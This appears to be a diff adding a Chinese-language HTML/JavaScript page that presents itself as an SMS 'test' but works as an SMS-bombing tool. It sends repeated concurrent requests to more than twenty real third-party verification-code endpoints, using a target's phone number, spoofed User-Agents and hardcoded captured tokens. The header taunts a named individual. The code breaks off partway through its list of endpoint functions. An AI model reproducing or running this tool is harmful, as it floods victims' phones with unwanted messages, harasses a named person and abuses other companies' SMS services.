@@ -1,0 +1,1516 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>短信测试</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", system-ui, sans-serif;
+        }
+        body {
+            background: #f5f7fa;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: #fff;
+            padding: 24px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .legal-section {
+            padding: 24px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        .legal-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ef4444;
+            margin-bottom: 12px;
+        }
+        .legal-content {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.8;
+            color: #374151;
+        }
+        .legal-content ol {
+            padding-left: 20px;
+        }
+        .legal-content li {
+            margin-bottom: 8px;
+        }
+        .agree-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #374151;
+        }
+        .agree-box input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .form-section {
+            padding: 24px;
+            border-bottom: 1px solid #e5e7eb;
+            display: none;
+        }
+        .form-section.active {
+            display: block;
+        }
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        .form-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-item label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+        }
+        .form-item input {
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        .form-item input:focus {
+            outline: none;
+            border-color: #6366f1;
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex: 1;
+            min-width: 120px;
+        }
+        .btn-primary {
+            background: #6366f1;
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: #4f46e5;
+        }
+        .btn-primary:disabled {
+            background: #a5b4fc;
+            cursor: not-allowed;
+        }
+        .btn-danger {
+            background: #ef4444;
+            color: #fff;
+        }
+        .btn-danger:hover {
+            background: #dc2626;
+        }
+        .btn-danger:disabled {
+            background: #fca5a5;
+            cursor: not-allowed;
+        }
+        .log-section {
+            padding: 24px;
+        }
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .log-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+        .log-stats {
+            display: flex;
+            gap: 16px;
+            font-size: 14px;
+        }
+        .stat-success {
+            color: #10b981;
+            font-weight: 500;
+        }
+        .stat-fail {
+            color: #ef4444;
+            font-weight: 500;
+        }
+        .stat-total {
+            color: #6366f1;
+            font-weight: 500;
+        }
+        .log-content {
+            background: #1f2937;
+            color: #f9fafb;
+            border-radius: 8px;
+            padding: 16px;
+            height: 400px;
+            overflow-y: auto;
+            font-family: "Consolas", "Monaco", monospace;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .log-item {
+            margin-bottom: 4px;
+            word-break: break-all;
+        }
+        .log-time {
+            color: #9ca3af;
+        }
+        .log-success {
+            color: #10b981;
+        }
+        .log-fail {
+            color: #f87171;
+        }
+        .log-info {
+            color: #60a5fa;
+        }
+        @media (max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .header h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>常子轩短信工具</h1>
+            <p>和平lD小萝莉常子轩</p>
+        </div>
+
+        <div class="legal-section">
+            <div class="legal-title">常子轩短信</div>
+            <div class="legal-content">
+                <ol>
+                    <li>常子轩牛逼666</li>
+                </ol>
+            </div>
+            <div class="agree-box">
+                <input type="checkbox" id="agreeCheck">
+                <label for="agreeCheck">(点我即可使用)</label>
+            </div>
+        </div>
+
+        <div class="form-section" id="formSection">
+            <div class="form-grid">
+                <div class="form-item">
+                    <label for="phone">手机号码</label>
+                    <input type="text" id="phone" placeholder="请输入11位手机号" maxlength="11">
+                </div>
+                <div class="form-item">
+                    <label for="loopCount">循环次数</label>
+                    <input type="number" id="loopCount" value="1" min="1" max="100">
+                </div>
+                <div class="form-item">
+                    <label for="concurrent">并发数量</label>
+                    <input type="number" id="concurrent" value="5" min="1" max="20">
+                </div>
+                <div class="form-item">
+                    <label for="interval">循环间隔(秒)</label>
+                    <input type="number" id="interval" value="10" min="3" max="300">
+                </div>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" id="startBtn">开始</button>
+                <button class="btn btn-danger" id="stopBtn" disabled>停止</button>
+            </div>
+        </div>
+
+        <div class="log-section">
+            <div class="log-header">
+                <div class="log-title">输出</div>
+                <div class="log-stats">
+                    <span class="stat-success">成功: <span id="successCount">0</span></span>
+                    <span class="stat-fail">失败: <span id="failCount">0</span></span>
+                    <span class="stat-total">总计: <span id="totalCount">0</span></span>
+                </div>
+            </div>
+            <div class="log-content" id="logContent"></div>
+        </div>
+    </div>
+
+    <script>
+        const agreeCheck = document.getElementById('agreeCheck');
+        const formSection = document.getElementById('formSection');
+        const phoneInput = document.getElementById('phone');
+        const loopCountInput = document.getElementById('loopCount');
+        const concurrentInput = document.getElementById('concurrent');
+        const intervalInput = document.getElementById('interval');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const logContent = document.getElementById('logContent');
+        const successCountEl = document.getElementById('successCount');
+        const failCountEl = document.getElementById('failCount');
+        const totalCountEl = document.getElementById('totalCount');
+
+        let isRunning = false;
+        let stopFlag = false;
+        let successCount = 0;
+        let failCount = 0;
+        let totalCount = 0;
+
+        agreeCheck.addEventListener('change', () => {
+            formSection.classList.toggle('active', agreeCheck.checked);
+        });
+
+        function generateRandomUserAgent() {
+            const uaList = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+                "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            ];
+            return uaList[Math.floor(Math.random() * uaList.length)];
+        }
+
+        function replacePhoneInData(dataStr, phone) {
+            const placeholders = ['13800000000', '15915637092', '15915637093', '15915637098', '13800000002', '13856312354', '13000000000', '13800000012'];
+            let result = dataStr;
+            placeholders.forEach(placeholder => {
+                result = result.replaceAll(placeholder, phone);
+            });
+            return result;
+        }
+
+        function getCurrentTimestamp() {
+            return String(Math.floor(Date.now() / 1000));
+        }
+
+        function addLog(content, type = 'info') {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString();
+            const logItem = document.createElement('div');
+            logItem.className = 'log-item';
+            logItem.innerHTML = `<span class="log-time">[${timeStr}]</span> <span class="log-${type}">${content}</span>`;
+            logContent.appendChild(logItem);
+            logContent.scrollTop = logContent.scrollHeight;
+        }
+
+        function resetStats() {
+            successCount = 0;
+            failCount = 0;
+            totalCount = 0;
+            successCountEl.textContent = successCount;
+            failCountEl.textContent = failCount;
+            totalCountEl.textContent = totalCount;
+            logContent.innerHTML = '';
+        }
+
+        function updateStats(isSuccess) {
+            totalCount++;
+            if (isSuccess) {
+                successCount++;
+                successCountEl.textContent = successCount;
+            } else {
+                failCount++;
+                failCountEl.textContent = failCount;
+            }
+            totalCountEl.textContent = totalCount;
+        }
+
+        async function sendWrapper(func, phone) {
+            try {
+                await func(phone);
+                updateStats(true);
+                addLog(`[${func.name}] 发送成功`, 'success');
+                return true;
+            } catch (e) {
+                updateStats(false);
+                addLog(`[${func.name}] 发送失败`, 'fail');
+                return false;
+            }
+        }
+
+        async function runConcurrent(functions, phone, concurrent) {
+            const results = [];
+            for (let i = 0; i < functions.length; i += concurrent) {
+                if (stopFlag) break;
+                const chunk = functions.slice(i, i + concurrent);
+                const chunkPromises = chunk.map(func => sendWrapper(func, phone));
+                const chunkResults = await Promise.all(chunkPromises);
+                results.push(...chunkResults);
+            }
+            return results;
+        }
+
+        async function main() {
+            const phone = phoneInput.value.trim();
+            const loopCount = parseInt(loopCountInput.value);
+            const concurrent = parseInt(concurrentInput.value);
+            const interval = parseInt(intervalInput.value) * 1000;
+
+            if (!phone || !/^\d{11}$/.test(phone)) {
+                addLog('请输入有效的11位手机号码', 'fail');
+                return;
+            }
+
+            resetStats();
+            isRunning = true;
+            stopFlag = false;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            addLog(`开始测试，手机号：${phone}，循环次数：${loopCount}，并发数：${concurrent}，循环间隔：${interval/1000}秒`, 'info');
+            addLog(`共加载 ${smsFunctions.length} 个测试接口`, 'info');
+
+            for (let i = 0; i < loopCount; i++) {
+                if (stopFlag) break;
+                addLog(`========== 开始第 ${i+1}/${loopCount} 轮测试 ==========`, 'info');
+                await runConcurrent(smsFunctions, phone, concurrent);
+                if (i < loopCount - 1 && !stopFlag) {
+                    addLog(`第 ${i+1} 轮测试完成，等待 ${interval/1000} 秒后进入下一轮`, 'info');
+                    await new Promise(resolve => setTimeout(resolve, interval));
+                }
+            }
+
+            addLog('========== 测试任务全部完成 ==========', 'info');
+            addLog(`最终统计：成功 ${successCount} 次，失败 ${failCount} 次，总计 ${totalCount} 次`, 'info');
+            isRunning = false;
+            stopFlag = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        startBtn.addEventListener('click', () => {
+            if (!isRunning) {
+                main();
+            }
+        });
+
+        stopBtn.addEventListener('click', () => {
+            if (isRunning) {
+                stopFlag = true;
+                addLog('正在停止测试任务...', 'info');
+                isRunning = false;
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+            }
+        });
+
+        const smsFunctions = [
+async function send_sms_2(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://yakeyun.ddsp.go2click.cn/mini/ortho/his/reg/smsApply";
+        const headers = {
+            "Host": "yakeyun.ddsp.go2click.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "appletcode": "mlk",
+            "applethid": "",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "logintoken": "24338847b5e0b7f61973a007d7c35a68",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx7e0a5d8de86658d5/176/page-frame.html"
+        };
+        let data = "{\"phone\":\"13800000000\",\"clientCode\":\"yky2020\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_3(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://ss.duya147.com/zba/api/sms";
+        const headers = {
+            "Host": "ss.duya147.com",
+            "Connection": "keep-alive",
+            "sec-ch-ua-platform": "\"Android\"",
+            "User-Agent": generateRandomUserAgent(),
+            "Accept": "application/json, text/plain, */*",
+            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
+            "Content-Type": "application/json;charset=UTF-8",
+            "sec-ch-ua-mobile": "?1",
+            "Origin": "https://ss.duya147.com",
+            "X-Requested-With": "com.tencent.mobileqq",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://ss.duya147.com/abz147/register",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        };
+        let data = "{\"mobile\":\"13800000000\",\"flag\":1}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_4(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://api.yahedso.com/notification/codes/login";
+        const headers = {
+            "Host": "api.yahedso.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "channel": "yahe-wechat-mini",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "sassappid": "0",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "token": "eyJhbGciOiJIUzI1NiJ9.eyJsb2dpblRpbWUiOjE3NjU2MTMzMjA3MzAsImxvZ2luVHlwZSI6IldFQ0hBVCIsInVzZXJJZCI6MTk5OTc1MzMyNDA0MzE4MjA5MCwidXNlclNvdXJjZSI6IldFQ0hBVCJ9.eCKWy9UOKnLIj51wc-9oun8QhllP20lU9OT6z676inU",
+            "Referer": "https://servicewechat.com/wx28364debdead316c/65/page-frame.html"
+        };
+        let data = "{\"recv\":\"13800000000\",\"verifyValue\":\"111111\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_5(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://mp.dsssp.com/aw_api/v1/login/apiLoginAwService/sendSmsRegisterVerifyCode";
+        const headers = {
+            "Host": "mp.dsssp.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "app-id": "wx10ad116a509bc468",
+            "auth": "",
+            "shop-id": "0",
+            "sign": "338ED133CFFC3C0D330D6C3597B17FE1",
+            "User-Agent": generateRandomUserAgent(),
+            "open-id": "o1tuS5IFsqsYjnB_PQbMhuEjH3UQ",
+            "union-id": "ozzMA65SxsPOwTcgv84bXktICFkk",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "v": "1.0.14.34",
+            "content-type": "application/json",
+            "project-id": "2010156361",
+            "store-puid": "82705",
+            "ts": getCurrentTimestamp(),
+            "Referer": "https://servicewechat.com/wx10ad116a509bc468/53/page-frame.html"
+        };
+        let data = "{\"mobile\":\"13800000000\",\"areaCode\":\"\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_6(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://m.aldi.com.cn/ouser-web/mobileRegister/sendCaptchasCodeForm.do";
+        const headers = {
+            "Host": "m.aldi.com.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "p-system": "weChat",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/x-www-form-urlencoded;text/html;charset=utf-8",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "cryptoversion": "621ed7c3d760780a3078f14f",
+            "p-releasecode": "",
+            "Referer": "https://servicewechat.com/wxcc73ef38a41c951a/373/page-frame.html"
+        };
+        let data = "mobile=13800000000&captchasType=3";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_7(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://www.ycfwcx.com:12399/GetVcodeAction.do?act=reg&mobilePhone=${phone}`;
+        const headers = {
+            "Host": "www.ycfwcx.com:12399",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "text/xml;charset=UTF-8",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx614f5d6294b6da99/41/page-frame.html"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_8(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://www.concare.cn/concare/tms/external/sendSms";
+        const headers = {
+            "Host": "www.concare.cn",
+            "Connection": "keep-alive",
+            "authorization": "",
+            "charset": "utf-8",
+            "operatoraccount": "",
+            "destination": "192.168.201.129:8045",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "operatorname": "",
+            "Referer": "https://servicewechat.com/wx37257d2a7be330e6/240/page-frame.html"
+        };
+        let data = "{\"phone\":\"13800000000\",\"type\":2}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_11(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://fms.zmd.com.cn/industry/api/applet/driver/getSmsRandomCode?phone=${phone}&loginType=1`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_12(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://proyiyunliapi.eyunli.com/api/sms/login?phoneNumber=${phone}`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_13(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://scenter.gaojin.com.cn/api/gateway/api/identity/v3/verify-code";
+        const headers = {
+            "Host": "scenter.gaojin.com.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "application-key": "6ad56a704a744a5980f7d8597be59378",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx8b03134380c41f67/27/page-frame.html"
+        };
+        let data = "{\"type\":1,\"target\":\"13800000000\",\"checkAccount\":true}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_14(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://tonghang.smartebao.com/oitTrade/applet/sms/sendLoginSms?phoneNo=${phone}`;
+        const headers = {
+            "Host": "tonghang.smartebao.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "mobile-request": "true",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "token": "",
+            "Referer": "https://servicewechat.com/wxcabd5caa3b36fe7d/82/page-frame.html"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_15(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://www.e-zhijian.com/wlhy168/sys/sms";
+        const headers = {
+            "Host": "www.e-zhijian.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "x-access-token": "",
+            "Referer": "https://servicewechat.com/wx0165148df5d6b027/18/page-frame.html"
+        };
+        let data = "{\"mobile\":\"13800000000\",\"smsmode\":1,\"randomNumber\":\"\",\"randomKey\":\"13800000000\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_17(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://twebapi.chaojuntms.com/BaseManage/Home/SmsSend";
+        const headers = {
+            "Host": "twebapi.chaojuntms.com",
+            "Connection": "keep-alive",
+            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiJBZG1pbiIsIkV4cGlyZSI6IjIwMjAtMTItMDIgMgjvMzM6NTMuOTc5In0.q0p7t0UxzF8clSJudmSkwKO6fHzVCIae4EZ5cDnhYI0",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxdcc8492fea52479c/23/page-frame.html"
+        };
+        let data = "{\"Moblie\":\"13000000000\",\"SmsCode\":\"\",\"OpenId\":\"\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_18(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://api.cx.chinasinai.com/proxyapi/msg/sendMsg";
+        const headers = {
+            "Host": "api.cx.chinasinai.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "token": "",
+            "Referer": "https://servicewechat.com/wx456af3c40ce2cb75/222/page-frame.html"
+        };
+        let data = "phone=13800000000";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_19(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://napi.tudgo.com/logistics/driver/login/captcha?phone=${phone}`;
+        const headers = {
+            "Host": "napi.tudgo.com",
+            "Connection": "keep-alive",
+            "authorization": "Bearer",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxdb81eba0fb33f8e1/24/page-frame.html"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_20(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://gy.huajichen.com/tms/app/sms/sendAliCode?phone=${phone}`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_22(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://api.ddduo.01tiaodong.cn/proxyapi/msg/sendMsg";
+        const headers = {
+            "Host": "api.ddduo.01tiaodong.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "token": "",
+            "Referer": "https://servicewechat.com/wx1d8ec8640fe8200e/282/page-frame.html"
+        };
+        let data = "phone=13800000000";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_23(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://prod.java.56etms.com/xq-route-plan-tms/user/sendSmsCodeNoCheck";
+        const headers = {
+            "Host": "prod.java.56etms.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "customer-type": "beta",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx2323bae3a815876d/125/page-frame.html"
+        };
+        let data = "phone=13856312354";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_24(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://yiliuyunshu.cn/wlhyapi/getSmsCode";
+        const headers = {
+            "Host": "yiliuyunshu.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "product": "app-wlhy-vhc",
+            "ip": "111.38.169.240",
+            "User-Agent": generateRandomUserAgent(),
+            "imei": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146",
+            "content-type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "osversion": "wechart-V2403A",
+            "Referer": "https://servicewechat.com/wxff5f8ee7ca544929/15/page-frame.html"
+        };
+        let data = "mobile=13800000002&productKey=weapp-wlhy-vhc&session3rd=d6d813d7-e3a4-4052-acd5-3d79bb791350";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_25(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://a.8m18.com/api/driver/login/verification_code";
+        const headers = {
+            "Host": "a.8m18.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "location": "",
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "tocker": "",
+            "Referer": "https://servicewechat.com/wx2748049892e9eb92/23/page-frame.html"
+        };
+        let data = "{\"tel\":\"13800000000\",\"pass\":\"\",\"code\":\"\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_26(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://weishop02.huanong1688.com/shop/s/guest/sendRegAuthCode";
+        const headers = {
+            "Host": "weishop02.huanong1688.com",
+            "Connection": "keep-alive",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
+            "sec-ch-ua-mobile": "?1",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": generateRandomUserAgent(),
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "token": "",
+            "Origin": "https://weishop02.huanong1688.com",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://weishop02.huanong1688.com/uk1635580563500826624/register/index",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        };
+        let data = "mobile=13800000000&businessType=1000&tenantId=uk1635580563500826624&lang=zh_CN";
